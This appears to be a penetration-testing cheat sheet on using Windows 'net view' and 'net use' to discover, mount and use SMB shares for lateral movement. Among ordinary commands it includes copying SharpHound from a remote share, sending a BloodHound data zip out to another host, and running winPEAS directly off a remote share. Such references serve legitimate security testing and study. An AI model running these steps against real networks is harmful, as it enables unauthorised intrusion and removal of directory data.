---
title: Windows Network Shares (net view / net use)
category: tunnels
subcategory: lateral-movement
os: windows
command: net view 10.4.26.4
tools: net
---


### Discover shares on a host

```cmd
net view 10.4.26.4
```

### Mount a share

```cmd
net use D: \\10.4.26.4\Documents
net use K: \\10.4.26.4\K$
dir K:
```

### Authenticated mount

```cmd
net use \\192.168.119.231\share /USER:test
```

### List/delete connections

```cmd
net use
net use * /del /y
```

### Copy through a mounted share

```cmd
copy \\192.168.168.168\share\SharpHound.exe
copy 20220424074629_BloodHound.zip \\192.168.119.213\share
```

### Run a binary directly off the share without saving locally

```cmd
\\192.168.168.168\share\winPEASany.exe
```
